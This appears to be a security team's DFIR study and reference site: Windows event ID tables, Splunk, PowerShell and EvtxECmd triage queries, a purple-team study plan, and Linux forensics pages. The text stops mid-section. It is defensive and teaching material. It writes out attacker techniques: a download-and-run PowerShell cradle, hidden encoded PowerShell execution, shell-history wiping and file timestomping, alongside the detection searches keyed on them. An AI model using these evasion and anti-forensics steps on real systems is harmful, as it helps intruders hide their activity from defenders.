The event IDs an incident responder looks for first, grouped by question ("who logged on?", "what ran?", "what persisted?"). Legacy (pre-Vista) IDs are usually the modern ID minus 4096 — 528 → 4624.

Not everything is on by default

4688 (process creation), 4698 (scheduled task), 4104 (PowerShell script block) and most object-access events need audit policy or GPO changes. Before concluding "nothing ran", confirm the log source was enabled — check Security for 4719 (audit policy changed) and look at the earliest event timestamp to detect log clearing / rollover.

docs.title: Logon & authentication (Security log)
docs.text: ID Meaning Notes 4624 Successful logon See Logon Type table below. Logon ID links to 4634/4647 and to 4672 4625 Failed logon Status/SubStatus say why (0xC000006A wrong password, 0xC0000064 no such user, 0xC0000234 locked out) 4634 Logoff Session end 4647 User-initiated logoff Interactive logoff 4648 Logon with explicit credentials runas, scheduled tasks with stored creds, lateral movement with alternate creds 4672 Special privileges assigned Admin-equivalent logon. Pair with the 4624 that has the same Logon ID 4768 Kerberos TGT requested (AS-REQ) On DC. Result Code 0x6 = user does not exist; 0x18 = bad password 4769 Kerberos service ticket requested (TGS-REQ) On DC. Kerberoasting: many 4769 with Ticket Encryption Type 0x17 (RC4) from one account 4771 Kerberos pre-auth failed Kerberos brute force 4776 NTLM credential validation On DC (domain) or local machine. Bursts = spraying 4778 / 4779 RDP session reconnected / disconnected Includes source hostname & IP 4740 Account locked out Points to the Caller Computer Name 4767 Account unlocked

docs.title: 4624 Logon Types
docs.text: Type Name Typical meaning 2 Interactive At the keyboard (or via VNC-style tool) 3 Network SMB share access, WinRM (pre-auth), PsExec, WMI. Most lateral movement 4 Batch Scheduled task 5 Service Service start 7 Unlock Workstation unlock 8 NetworkCleartext IIS Basic auth, some PowerShell remoting 9 NewCredentials runas /netonly, Cobalt Strike make_token, pass-the-hash tooling 10 RemoteInteractive RDP / Terminal Services 11 CachedInteractive Domain creds used while DC unreachable (laptop off-network)

docs.title: Account management (Security log)
docs.text: ID Meaning 4720 User account created 4722 User account enabled 4723 / 4724 Password change attempt (user) / reset (admin) 4725 User account disabled 4726 User account deleted 4728 / 4732 / 4756 Member added to global / local / universal security group 4729 / 4733 / 4757 Member removed from the same 4738 User account changed 4741 / 4742 / 4743 Computer account created / changed / deleted 4794 DSRM password set (Directory Services Restore Mode — DC persistence)

docs.title: Process & command execution
docs.text: Log ID Meaning Notes Security 4688 New process created Enable Include command line in process creation events via GPO, otherwise you get the image path only Security 4689 Process exited Sysmon 1 Process create Command line, hashes, parent — the gold standard if Sysmon is deployed Sysmon 3 Network connection Process ↔ destination IP/port Sysmon 7 Image loaded DLL load — side-loading, unsigned DLLs Sysmon 8 CreateRemoteThread Classic injection Sysmon 10 ProcessAccess LSASS access (lsass.exe target, 0x1010/0x1fffff access) = credential dumping Sysmon 11 File created Droppers, staged tools Sysmon 12 / 13 / 14 Registry object create/delete / value set / key rename Run keys, services Sysmon 22 DNS query Process → domain PowerShell/Operational 4103 Module logging (pipeline execution) PowerShell/Operational 4104 Script block logging Decoded script content — even -enc payloads. Enable via GPO Windows PowerShell (classic) 400 / 403 Engine start / stop HostApplication field shows the command line even without 4688 Windows PowerShell (classic) 600 Provider started Security 4698 / 4699 Scheduled task created / deleted Task XML is in the event Security 4700 / 4701 / 4702 Scheduled task enabled / disabled / updated TaskScheduler/Operational 106 / 140 / 141 / 200 / 201 Task registered / updated / deleted / action started / action completed Log is often disabled by default on newer builds System 7045 New service installed PsExec (PSEXESVC), Cobalt Strike jump psexec, Meterpreter services Security 4697 Service installed (Security-side view of 7045) Requires audit policy System 7034 / 7035 / 7036 / 7040 Service crashed / control sent / state change / start type changed 7040 = someone set a service to disabled (e.g. Defender, VSS) Application 1000 / 1001 Application crash / WER report Exploit gone wrong, injected process crashing

docs.title: Persistence & tampering
docs.text: Log ID Meaning Security 4657 Registry value modified (needs SACL) Security 4663 Object access attempt (file/registry, needs SACL) Security 4670 Permissions on an object changed Security 4719 System audit policy changed — attackers turn logging off Security 1102 Security log cleared System 104 Event log cleared (any log) Security 4616 System time changed Security 4720 (see above) new local user = persistence Security 5140 / 5145 Network share accessed / share object checked (\\*\ADMIN$, \\*\C$, IPC$) Security 5156 / 5157 Windows Filtering Platform allowed / blocked a connection (very noisy) Windows Defender/Operational 1116 / 1117 Malware detected / action taken Windows Defender/Operational 5001 / 5007 Real-time protection disabled / config changed Microsoft-Windows-WMI-Activity/Operational 5857 – 5861 WMI provider / consumer activity. 5861 = permanent event consumer created (WMI persistence) Security 4720 + 4732 in quick succession New user immediately added to Administrators

docs.title: Remote access & lateral movement
docs.text: Log ID Meaning Security 4624 type 3 + 5140 ADMIN$ + System 7045 PsExec-style execution chain Security 4624 type 10 / 4778 RDP logon TerminalServices-RemoteConnectionManager/Operational 1149 RDP network connection succeeded (pre-logon) — includes source IP TerminalServices-LocalSessionManager/Operational 21 / 22 / 24 / 25 RDP session logon / shell start / disconnect / reconnect RemoteDesktopServices-RdpCoreTS/Operational 131 Incoming RDP connection (source IP) Microsoft-Windows-WinRM/Operational 6 / 91 / 168 WinRM client connecting / shell created / authenticating user Security 4688 wsmprovhost.exe PowerShell Remoting on the target Security 4688 wmiprvse.exe parent WMI execution on the target Security 4648 Explicit creds — often the source side of lateral movement Security 4624 type 9 runas /netonly / pass-the-hash style token

docs.title: USB & devices
docs.text: Log ID Meaning Security 6416 New external device recognised Security 6419 – 6424 Device install / disable / enable events DriverFrameworks-UserMode/Operational 2003 / 2100 / 2102 USB device plugged in / unplugged (log often disabled) Microsoft-Windows-Partition/Diagnostic 1006 Device connected/disconnected with serial & partition info Security 4663 on \Device\HarddiskVolume File access on removable media (needs SACL)

docs.title: Cheat: first triage query set
docs.text:
SplunkPowerShell (live)EvtxECmd (offline) 
index=wineventlog sourcetype=WinEventLog:Security
EventCode IN (1102, 4624, 4625, 4648, 4672, 4688, 4697, 4698, 4720, 4732, 4776)
| eval LogonType=coalesce(Logon_Type, LogonType)
| stats count min(_time) as first max(_time) as last by host, EventCode, user, LogonType
| convert ctime(first) ctime(last)
| sort host, EventCode

Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624,4625,4648,4672,4688,4698,4720,1102; StartTime=(Get-Date).AddDays(-7)} |
  Select-Object TimeCreated, Id, @{n='Msg';e={$_.Message.Split("`n")[0]}} |
  Format-Table -AutoSize

EvtxECmd.exe -d C:\Case\Logs --csv C:\Case\Out --inc 1102,4624,4625,4648,4672,4688,4697,4698,4720,4732,7045

docs.title: Learning Path
docs.text:
How to grow from "I can use Splunk" to someone who can read a packet and understand the attack, explain what Windows and Linux are doing internally, reproduce attacker behaviour in a lab, find the endpoint and network evidence, analyse the malware, and write the detection. That combination is what senior threat hunters, DFIR analysts, malware analysts and red teamers have in common.

Page Use it for Roadmap The order to learn things in, and why — eight pillars from fundamentals to detection engineering Purple-team weekly loop The study method: one ATT&CK technique per week, attack → artifacts → query → note. Fully worked example for T1059 (PowerShell) 24-month curriculum Month-by-month plan with goals and checkpoints Training resources Free and paid labs, courses and books, grouped by pillar

The one-sentence version

Depth beats breadth: learn networks → Windows internals & Active Directory → offensive techniques → malware & reverse engineering → detection engineering, and study every attack together with its detection.

docs.title: 24-Month Curriculum
docs.text:
Category: Study plan · Pace: ~8–10 hours a week alongside work · Last updated: 2026-10-07

Summary

A two-year plan following the roadmap order: networks → Windows internals & AD → offence → malware & reverse engineering → detection engineering, with Python/C running alongside and the purple-team weekly loop as the constant habit. Each phase ends with a checkpoint — something you can show, not just a course completed.

docs.text: Month Study Practise Checkpoint 1 TCP/IP, ARP, DHCP, DNS in Wireshark; well-known ports Capture your own lab traffic; label every packet of a DNS lookup and a TCP handshake Explain a 3-way handshake and DNS resolution from a pcap 2 HTTP, TLS, SSH, SMB; Zeek logs Python: parse Zeek conn.log into a summary (top talkers, long connections) Your first Python tool on GitHub 3 LDAP, RPC, Kerberos on the wire; Suricata rules basics Write 3 local Suricata rules; Arkime hunting from hunting workflows Purple-loop weeks 16–17 (HTTP & DNS C2) done

docs.title: Phase 2 — Months 4–8: Windows internals and Active Directory
docs.text: Month Study Practise Checkpoint 4 Processes, threads, services, registry, tokens, integrity levels (Windows Internals Part 1 ch. 1–3, Sysinternals) Process Explorer/Process Monitor on normal activity; event IDs Explain a process tree and token of a running service 5 Event logging, Sysmon config, artifacts (Prefetch, Amcache, registry) Build a lab: DC + 2 workstations + Splunk + Sysmon Lab running with logs in Splunk 6 NTLM in depth → Pass-the-Hash, relay Purple-loop weeks 5, 21 Diagram of NTLM + where each attack inserts itself 7 Kerberos: TGT/TGS, SPNs, delegation Purple-loop weeks 6, 22; Golden/Silver Explain why Kerberoasting works and what breaks it 8 Credential architecture: LSASS, SAM, LSA secrets, DPAPI, Credential Guard Purple-loop weeks 7, 8; hardening matrix Credential-theft detection set in Splunk

docs.title: Phase 3 — Months 7–12: Offence in a lab (overlaps phase 2)
docs.text: Month Study Practise Checkpoint 7–8 PortSwigger: authentication, access control, SQLi, XSS, SSRF All apprentice + some practitioner labs Explain each vuln class and the log/HTTP evidence it leaves 9–12 HTB Academy Penetration Tester path: recon → enumeration → exploitation → privesc → lateral movement HTB machines (retired, with write-ups afterwards); purple-loop weeks 9–15 For every box: an attacker write-up and a defender write-up

docs.title: Phase 4 — Months 9–16: C, assembly and reverse engineering
docs.text: Month Study Practise Checkpoint 9–10 C: pointers, memory, stack/heap, structs; Windows API calls Write: process lister, file hasher, a simple injector (lab only) Read a C injector and map each API to process injection artifacts 11 PE format, imports/exports, pefile in Python Python PE triage tool (imports, sections, entropy) Tool flags packed/suspicious PEs 12–13 x86/x64 assembly, calling conventions; Malware Unicorn RE101 Reverse your own C programs in Ghidra and x64dbg Recognise loops, calls, strings decryption in disassembly 14–16 Static + dynamic malware analysis in an isolated VM Samples from public training sets; memory forensics of the same samples Report: files → persistence → credential access → C2, mapped to ATT&CK

docs.title: Phase 5 — Months 17–24: Detection engineering and capstone
docs.text: Month Study Practise Checkpoint 17–18 Detection-as-code: Sigma, SPL best practice, testing for false positives; hunting patterns Convert 10 of your purple-loop queries to Sigma; version them in Git Detection library with tests 19–20 Threat-intel driven hunting: DPRK TTPs, other actor reports Pick one actor, build a 5-technique emulation plan, run it, hunt it Hunt report with gaps and new detections 21–22 DFIR case work: CyberDefenders / BTLO cases, full timelines with Plaso and KAPE One case per fortnight, written as a real incident report 4 case reports 23–24 Capstone: a full intrusion in your lab, phishing → exfiltration, then investigate it cold (ideally a friend runs the attack) Use every tool on this site End-to-end incident report + detections + lessons learned

docs.title: Rules that keep the plan alive
docs.text:
• Weekly loop never stops — even in heavy months, do one technique.
  • Write everything here. A page on this site is the proof of learning; if you can't write it, you don't know it yet.
  • Labs only for offensive work, isolated from work and home networks.
  • Re-plan every quarter: move months around, but keep the order of the pillars.

docs.title: Purple-Team Weekly Loop
docs.text:
Category: Study method · Rhythm: 1 week = 1 ATT&CK technique · Last updated: 2026-10-07

Summary

Instead of a generic beginner curriculum, use the blue-team stack you already have — Splunk, Zeek, Suricata, Arkime, Velociraptor — and learn one MITRE ATT&CK technique per week: understand it as the attacker, run it in a lab, find every trace it leaves, write the detection, and finish with a one-page note. After a year that is ~50 techniques you can explain from both sides.

docs.title: The loop
docs.text:
flowchart LR
    A[1. Understand<br/>attacker view] --> B[2. Execute<br/>in the lab]
    B --> C[3. Host evidence<br/>Event Logs + Sysmon]
    C --> D[4. Endpoint collection<br/>Velociraptor]
    D --> E[5. Network evidence<br/>Zeek / Suricata / Arkime]
    E --> F[6. Detection<br/>Splunk SPL]
    F --> G[7. Map & write up<br/>ATT&CK + 1-page note]
    G -.next week.-> A
Day Step Output 1 Read the ATT&CK page and 1–2 procedure examples; read this site's page for the technique 5-line explanation of why the technique works 2 Execute in the lab (manually and/or with Atomic Red Team) — snapshot the VM first Exact commands + timestamps 3 Find the host evidence: Security, Sysmon, PowerShell, System logs; registry/file artifacts List of event IDs and fields that show it 4 Collect with Velociraptor; check network side in Zeek/Suricata/Arkime Artifact names, pcap/log evidence 5 Write and tune the SPL; test it against noise (run normal admin activity too) Saved search + false-positive notes 6–7 Write the one-page note (template below); list visibility gaps Note committed to this site

docs.title: 1 · Understand (attacker view)
docs.text: PowerShell is a full scripting language with direct access to .NET and the Windows API, installed on every modern Windows host. Attackers use it to download and run code in memory (IEX (New-Object Net.WebClient).DownloadString(...)), to hide commands with -EncodedCommand (Base64 of UTF-16LE text), and to run without a profile or window (-nop -w hidden). See PowerShell cradles for the full attacker side.

docs.title: 2 · Execute in the lab (harmless payload)
docs.text:
# Build an encoded command for a harmless action
$cmd   = 'Write-Output "purple-test"; Get-Process | Select-Object -First 3'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$b64   = [Convert]::ToBase64String($bytes)

# Run it the way an attacker would (hidden window, no profile, encoded)
powershell.exe -nop -w hidden -enc $b64

# Optional: same idea through Atomic Red Team (list tests first, pick a benign one)
Invoke-AtomicTest T1059.001 -ShowDetailsBrief

Before running, make sure these are on in the lab: Script Block Logging (GPO Administrative Templates › Windows Components › Windows PowerShell › Turn on PowerShell Script Block Logging), process creation with command line (4688), and Sysmon.

docs.title: 3 · Host evidence
docs.text: Source Event What you will see Sysmon 1 — process created Image=...\powershell.exe, CommandLine contains -enc, ParentImage (who launched it) Security 4688 — process created Same as above, only if "Include command line in process creation events" is enabled PowerShell/Operational 4104 — script block logged The decoded script text — attackers can encode the command line, but 4104 records what actually ran PowerShell/Operational 4103 — module logging Pipeline/command details (if module logging enabled) Windows PowerShell (classic) 400 / 600 Engine start with HostApplication = full command line — useful because it exists even on old systems

docs.title: 4 · Splunk detection — line by line
docs.text:
index=botsv3 sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 Image="*\\powershell.exe"
| where match(CommandLine, "(?i)\s-(e|en|enc|enco|encod|encode|encoded|encodedcommand)\s")
| rex field=CommandLine "(?i)-e\w*\s+(?<b64>[A-Za-z0-9+/=]{20,})"
| table _time, host, User, ParentImage, CommandLine, b64
  • index=botsv3 sourcetype=... EventID=1 — Sysmon process-creation events.
  • Image="*\\powershell.exe" — only PowerShell processes (* = anything before, \\ = one backslash).
  • where match(CommandLine, "...") — keep command lines with any abbreviation of -EncodedCommand (PowerShell accepts -e, -en, -enc … all of them). (?i) makes the regex case-insensitive.
  • rex field=CommandLine "...(?<b64>...)" — extract the Base64 blob into a new field called b64 so you can decode it.
  • table — show only the columns you need.

Result:

_time host User ParentImage CommandLine b64 2026-10-07 21:04:11 LAB-WIN10 LAB\analyst C:\Windows\explorer.exe powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0A... VwByAGkAdABlAC0A...

Then confirm what actually ran from the script-block log:

index=botsv3 sourcetype="XmlWinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104
| search ScriptBlockText="*purple-test*" OR ScriptBlockText="*DownloadString*" OR ScriptBlockText="*FromBase64String*"
| table _time, host, ScriptBlockText
  • EventCode=4104 — script block logging: the decoded text of the script.
  • search ScriptBlockText="*...*" — look for our test marker plus two classic attacker keywords.
  • The result shows Write-Output "purple-test"; Get-Process | Select-Object -First 3 in plain text — proof that 4104 defeats the encoding.

docs.title: 5 · Velociraptor
docs.text:
Artifact Why Windows.EventLogs.PowershellScriptblock Pulls 4104 events from the endpoint even if they never reached the SIEM Windows.System.Powershell.PSReadline Interactive command history (ConsoleHost_history.txt) per user Windows.Forensics.Prefetch Proves POWERSHELL.EXE executed and when (workstations) — see Prefetch

See Velociraptor for running hunts.

docs.title: 6 · Network side
docs.text:
• Zeek http.log: if the script downloads over HTTP, the default user_agent contains WindowsPowerShell — zeek-cut ts id.orig_h host uri user_agent < http.log | grep -i powershell.

  • Suricata — a local rule for the same idea:

    alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"LOCAL PowerShell user-agent outbound"; flow:established,to_server; http.user_agent; content:"WindowsPowerShell"; nocase; sid:1000001; rev:1;)

  • Arkime: http.user-agent == *PowerShell* to pull the sessions and download the pcap.

  • Over HTTPS you will not see the user agent — look at JA3/JA4 and the destination instead (Zeek SSL).

docs.title: 7 · The one-page note (template)
docs.text:
# T1059.001 — PowerShell
**Why it works:** built-in, trusted, runs .NET in memory; -enc hides intent.
**Lab commands:** powershell -nop -w hidden -enc <b64>   (2026-10-07 21:04, LAB-WIN10)
**Host evidence:** Sysmon 1 / 4688 (command line), 4104 (decoded script), 400 (HostApplication)
**Endpoint collection:** Velociraptor PowershellScriptblock, PSReadline, Prefetch
**Network evidence:** Zeek http.log UA "WindowsPowerShell"; Suricata sid 1000001
**Detection:** [SPL saved search name] — FP: SCCM/Intune scripts using -enc
**ATT&CK:** T1059.001 (Execution)
**Gaps:** 4104 not forwarded on servers; no TLS inspection

docs.text:
Each row links to the page on this site that already holds the attacker and detection detail.

Week Technique ATT&CK Page 1 PowerShell / command interpreters T1059.001 PowerShell cradles 2 Scheduled Task T1053.005 Persistence 3 Windows Service T1543.003 Persistence 4 Registry Run keys T1547.001 Persistence 5 NTLM & Pass-the-Hash T1550.002 Pass-the-Hash 6 Kerberos & Kerberoasting T1558.003 Kerberoasting 7 Credential dumping (LSASS) T1003.001 LSASS dumping 8 SAM / NTDS extraction T1003.002/.003 SAM & NTDS 9 SMB / PsExec T1021.002 PsExec & SMB 10 RDP T1021.001 RDP 11 WMI T1047 WMI & WinRM 12 WinRM T1021.006 WMI & WinRM 13 LOLBins (certutil, mshta, rundll32) T1218, T1105 LOLBins 14 Phishing → user execution T1566, T1204 Phishing delivery 15 Web shell T1505.003 Web shell playbook 16 HTTP(S) C2 & beaconing T1071.001 Beaconing & C2 17 DNS C2 / tunnelling T1071.004 Zeek dns.log 18 Process injection T1055 Process injection 19 UAC bypass T1548.002 UAC bypass 20 Token impersonation T1134 Token & Potato 21 LLMNR poisoning & NTLM relay T1557.001 LLMNR & NTLM relay 22 DCSync T1003.006 DCSync 23 Impair defenses & log clearing T1562, T1070.001 Impair defenses 24 Exfiltration over web services T1567 Data exfiltration playbook

After week 24, chain them: run weeks 14 → 1 → 2 → 7 → 9 → 16 → 24 as one intrusion and investigate it end to end as a case.

docs.title: Roadmap
docs.text:
Category: Study plan · Goal: advanced threat hunting / DFIR / malware analysis · Last updated: 2026-10-07

Summary

Top-tier attackers are not good because they know many tools — they are good because they understand computers deeply. The same is true for the defenders who catch them. This roadmap puts low-level system knowledge and the attacker's point of view on top of a blue-team tool stack (Splunk, Zeek, Suricata, Arkime, Velociraptor), in a deliberate order.

docs.title: The recommended order
docs.text:
flowchart LR
    N[1. Networks<br/>packets & protocols] --> W[2. Windows internals<br/>& Active Directory]
    W --> O[3. Offensive techniques<br/>in a lab]
    O --> M[4. Malware analysis<br/>& reverse engineering]
    M --> D[5. Detection engineering<br/>& purple teaming]
    P[Programming: Python → C → assembly] -.runs alongside.-> W
    P -.-> M

At this stage, going deep on Windows/AD and programming raises real skill far more than collecting more certificates.

docs.title: 1. Computer fundamentals — deeply
docs.text:
• Linux without a GUI: processes, permissions, systemd, logs, /proc, networking commands. See Linux commands.
  • Windows: how processes, services, the registry, permissions, access tokens and event logs actually work.
  • Networking: not just TCP/IP — be able to look at packets and explain ARP, DNS, DHCP, HTTP, TLS, SSH, SMB, LDAP, RPC. Use Wireshark/tshark and Zeek on your own traffic.
  • For Windows environments, study in this order: NTLM → Kerberos → Active Directory → Windows credential architecture (LSASS, SAM, LSA secrets, DPAPI).

You are done when you can draw an SMB session or a Kerberos ticket exchange from memory and point to each step in a pcap.

docs.title: 2. Programming — Python fluently, then C
docs.text:
• Python until it's comfortable: parse logs, process pcaps (scapy, pyshark), call APIs (Splunk REST, VirusTotal), analyse files (pefile), automate triage.
  • C: pointers, memory, stack vs heap, processes, DLLs, system calls. Write small programs that call the Windows API (CreateProcess, OpenProcess, ReadProcessMemory).
  • Advanced: x86/x64 assembly. This is where malware analysis and exploit understanding take off.

You are done when you can write a Python tool that turns raw evidence into a CSV timeline, and read a 50-line C program that injects into a process and explain each call.

docs.title: 3. Attack — but only in a lab
docs.text:
• Start with web: HTTP, authentication, access control, SQL injection, XSS, SSRF — PortSwigger Web Security Academy (free, with labs).
  • Then a full penetration-testing flow: reconnaissance → enumeration → exploitation → privilege escalation → lateral movement (HTB Academy Penetration Tester path).
  • Never against systems you don't own or have written permission to test.

docs.title: 4. Windows & Active Directory attack and defence
docs.text:
• NTLM authentication → Pass-the-Hash → NTLM relay.
  • Kerberos: TGT/TGS, SPNs, delegation, service accounts → Kerberoasting, AS-REP roasting, Golden/Silver tickets, DCSync, ADCS.
  • The goal is not memorising commands but being able to explain "which property of this authentication design makes this attack possible?" — and therefore which control breaks it.

docs.title: 5. Reverse engineering
docs.text:
• PE format, imports/exports, strings, the Windows API, x86/x64 assembly, a debugger (x64dbg) and a disassembler (Ghidra).
  • Start with small programs you wrote yourself, then real samples in an isolated VM. Malware Unicorn's RE101 walks through static and dynamic analysis step by step.
  • Practise answering: how does this sample create files → persist → steal credentials → reach C2? — then map each answer to ATT&CK.

docs.title: 6. Attack and detection as one set (purple team)
docs.text:
The most important habit. After you perform any technique in the lab, don't stop:

  1. Find the traces in Windows Event Logs and Sysmon.
  2. Confirm endpoint artifacts with Velociraptor.
  3. Look at the network side in Zeek / Suricata / Arkime.
  4. Write the Splunk SPL detection.
  5. Map it to the MITRE ATT&CK technique.

This is turned into a weekly routine on the purple-team loop page.

docs.title: 7. Follow one attack from start to finish
docs.text: Treat a whole intrusion as one case: Phishing / web exploit → Execution → Persistence → Privilege escalation → Credential access → Discovery → Lateral movement → C2 → Exfiltration. Real groups' procedures are the best scenario source — for example the North Korea TTPs page and MITRE's Lazarus Group entry. The Adversary index shows a typical intrusion mapped to this site's pages.

docs.title: 8. Investigate like a real case, not only CTFs
docs.text:
• pwn.college builds Linux and low-level security understanding step by step.
  • CyberDefenders (and Blue Team Labs Online) give DFIR, threat-hunting, network-forensics and malware-analysis cases shaped like real incidents.
  • Write every case up as if a manager will read it: timeline, scope, root cause, evidence, recommendations.

docs.title: Where this leads after about a year
docs.text:
Not "someone who can use Splunk", but someone who can:

read packets and understand the attack → understand Windows/Linux internals → reproduce attacker behaviour → find endpoint and network evidence → analyse malware → build detection logic.

docs.title: Linux Forensics
docs.text: Artifacts and log sources on Linux hosts — servers, containers hosts, and the occasional workstation. Start from the question; the mechanics are on each page.

docs.title: Question → where to look
docs.text: Question Primary Also check Who logged in, from where, and what did they type? Auth & history — auth.log/secure, wtmp/btmp, shell history journald, auditd execve How does the attacker survive reboot? Persistence — cron, systemd, SSH keys, profiles, PAM, modules package-integrity check (rpm -Va/dpkg --verify) When was this file created/modified — was it timestomped? Filesystem & timestamps — MACB, ctime, ext4 birth Sleuth Kit timeline, ext4 journal What ran / what's running / what's listening? Logs, processes & triage — ps, ss, /proc, auditd deleted-but-open binaries in /proc What was installed and when? Logs & triage — dpkg.log/apt history/yum.log package integrity Web server on Linux got popped Web shell playbook Apache/Nginx logs, logs & triage Collect it all UAC / CatScale / Velociraptor Imaging

docs.title: Pages
docs.text:
• Auth & history — auth logs, wtmp/btmp/lastlog, shell history, cross-checking tampered logs
  • Persistence — cron, systemd, profiles, SSH keys, PAM, LD_PRELOAD, modules; package-integrity checks
  • Filesystem & timestamps — MACB, ctime timestomp detection, hidden/setuid files, deleted-but-open, ext4 journal
  • Logs, processes & triage — log map, running-state snapshot, process triage, one-shot script

docs.title: How Linux differs from Windows (for the Windows-heavy analyst)
docs.text: The investigative method is the same — timeline, pivot on keys, cross-check sources — but the artifacts differ. There's no registry (config is text files under /etc), no Prefetch/Amcache (execution evidence comes from auditd, shell history, and package logs, if any), no $MFT $FILE_NAME second timestamp set (so ctime is your timestomp detector instead), and logs are plain text or journald rather than EVTX. The biggest variable is what logging was enabled: with auditd you have Sysmon-grade execution data; without it, you're reconstructing from history files, journald, and the file system. Note the logging posture in every report.

docs.title: Order of work (live host)
docs.text:
1. Snapshot volatile state first — ps, ss, /proc, lsof, lsmod (logs & triage) — before it changes or a memory image reboots the box.
  2. Auth story — who got in.
  3. Persistence sweep — where they hid, plus package integrity.
  4. File-system timeline — what changed, when.
  5. Correlate; escalate to the matching playbook if it's more than one host.

Adding a page here

python new.py linux/<name> -t artifact (or -t concept) — it appears in the sidebar automatically.

docs.title: Authentication & Shell History
docs.text:
Category: Linux · Sources: auth logs, wtmp/btmp, shell history · Last updated: 2026-09-17

In one sentence

On Linux the "who got in and what did they type" story lives in a handful of text logs (/var/log/auth.log or secure, journald), the binary login databases (wtmp/btmp/lastlog), and per-user shell history files — each easy to read, and each easy for an attacker to tamper with, so you cross-check them against each other and against the file-system timeline.

docs.title: Authentication logs
docs.text:
File Distro Contents /var/log/auth.log Debian/Ubuntu SSH, sudo, su, PAM, cron auth, login /var/log/secure RHEL/CentOS/Fedora same, RHEL family journalctl (systemd journal) all systemd structured logs incl. auth (_SYSTEMD_UNIT=sshd.service) — may be the only copy if text logging is off /var/log/audit/audit.log auditd installed kernel-level auth, execve, file access — the richest source when present

What to read from them:

# Successful SSH logins: user, source IP, method (password/publickey)
grep -E "sshd.*Accepted" /var/log/auth.log
#   "Accepted publickey for root from 203.0.113.7 port 5123 ssh2: RSA SHA256:..."

# Failed SSH (brute force) — count by source IP
grep -E "sshd.*Failed password" /var/log/auth.log | grep -oE "from [0-9.]+" | sort | uniq -c | sort -rn | head

# sudo usage: who ran what as whom
grep -E "sudo:.*COMMAND" /var/log/auth.log
#   "user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/bash"

# su / new sessions / user & group changes
grep -E "su\[|session opened|useradd|usermod|groupadd|passwd" /var/log/auth.log

# From the journal instead (survives text-log deletion)
journalctl -u ssh -o short-iso | grep -Ei "accepted|failed|invalid user"
journalctl _COMM=sudo -o short-iso

Signals: Accepted publickey for root (direct root login should usually be disabled), Failed password bursts (brute force) then an Accepted (successful), Invalid user sweeps (username enumeration), Accepted from an unexpected country/ASN, sudo to root by a user who normally doesn't, and new-account/group events (useradd, added to sudo/wheel).

docs.title: Login databases (binary)
docs.text:
File Read with Contents /var/log/wtmp last Successful logins/logouts + reboots, with source & duration /var/log/btmp lastb (root) Failed login attempts /var/run/utmp who, w Currently logged-in users /var/log/lastlog lastlog Last login time per account 
last -Faiw                 # full timestamps, IPs, no truncation
last -f /path/to/wtmp      # a wtmp pulled from an image
lastb -Fai                 # failed logins (brute-force sources)
who -a ; w                 # live sessions right now (do this during live response)

These are tamper targets

wtmp/btmp/utmp are binary and attackers zero specific entries with tools (utmpdump edit + re-import, or purpose-built cleaners). A login in auth.log with no matching last entry (or vice-versa), or a suspiciously clean wtmp on a busy server, is itself a finding. journalctl and audit.log are separate copies — compare them.

docs.title: Shell history
docs.text:
File Notes ~/.bash_history Bash — only written on clean logout, no timestamps unless HISTTIMEFORMAT was set; size capped by HISTSIZE ~/.zsh_history Zsh — often has epoch timestamps (: 1699999999:0;command) ~/.local/share/fish/fish_history, ~/.python_history, ~/.mysql_history, ~/.psql_history, ~/.rediscli_history, ~/.lesshst Other interactive tools /root/.bash_history Root's history — always check 
# Every user's bash history in one pass
for h in /home/*/.bash_history /root/.bash_history; do echo "== $h =="; cat "$h" 2>/dev/null; done

# Zsh with timestamps decoded
awk -F';' '/^: [0-9]/{ "date -d @"substr($1,3,10) | getline d; print d" | "$0 }' ~/.zsh_history

Absence of history is a signal, not an all-clear

Attackers routinely disable or wipe history: unset HISTFILE, export HISTSIZE=0, ln -sf /dev/null ~/.bash_history, history -c, or running from a shell that doesn't persist. An empty or symlinked-to-/dev/null history on an actively-used account is suspicious. Fall back to auditd (execve records every command with args), journald, process accounting (lastcomm/sa if acct is enabled), and network/host telemetry.

docs.title: Cross-check everything
docs.text:
A single log lies; the intersection doesn't. Build the picture from all sources and note the disagreements:

  • auth.log says user X logged in from IP at time T → does last/wtmp agree? Does the shell history show commands right after T? Does the file-system $MFT-equivalent (timestamps) show files created then?
  • A sudo-to-root in auth.log → what did they run (COMMAND=), and does bash history / auditd confirm?
  • SSH Accepted publickey → whose key? Check ~/.ssh/authorized_keys for keys the user didn't add (persistence).

docs.title: Live-response quick set
docs.text:
w ; who -a                                  # who's on now
last -Faiw | head -40                       # recent logins
lastb -Fai | head                           # recent failures
ss -tunap                                    # current connections + owning process
grep -E "Accepted|sudo.*COMMAND|useradd" /var/log/auth.log | tail -50
for h in /home/*/.bash_history /root/.bash_history; do echo "== $h =="; tail -50 "$h"; done

docs.title: References
docs.text:
• Linux auth logging — man sshd, PAM
  • last, lastb, utmp formats
  • Linux auditd

docs.title: Filesystem & Timestamps
docs.text:
Category: Linux · Filesystems: ext4, xfs · Last updated: 2026-09-17

In one sentence

Linux files carry four timestamps (MACB) but — unlike NTFS — the crtime (birth) is hidden and there is no $FILE_NAME second set, so timestomping is harder to detect; you lean on the change time (ctime), the journal, and inode/link anomalies instead.

docs.title: The four timestamps (MACB)
docs.text:
Timestamp stat name Set when Attacker control M — modify Modify (mtime) File content changes touch -m -d, touch -r — easily forged A — access Access (atime) File read Often disabled (relatime/noatime) for performance; unreliable C — change Change (ctime) Inode metadata changes (perms, owner, links, or mtime being set) Cannot be set by touch without changing the clock — the timestomp tell B — birth Birth (crtime) File created Stored in ext4/xfs inode but not shown by default — needs debugfs/xfs_db or stat on new kernels 
stat file                          # M, A, C shown; Birth shown if kernel/fs supports it
# ext4 birth time when stat won't show it:
debugfs -R "stat <inode>" /dev/sda1 2>/dev/null | grep -i crtime
# get inode first:
ls -i file

ctime catches timestomping

touch -d "2020-01-01" evil sets mtime and atime to the past — but ctime updates to now (you changed the inode). So mtime far in the past while ctime is recent = the file was timestomped (or its metadata legitimately changed). Compare stat's Modify vs Change. Attackers who also want to fix ctime must change the system clock or use raw device writes — much harder and itself detectable.

docs.title: Finding recently changed files
docs.text:
# Files with content changed in the incident window (mtime)
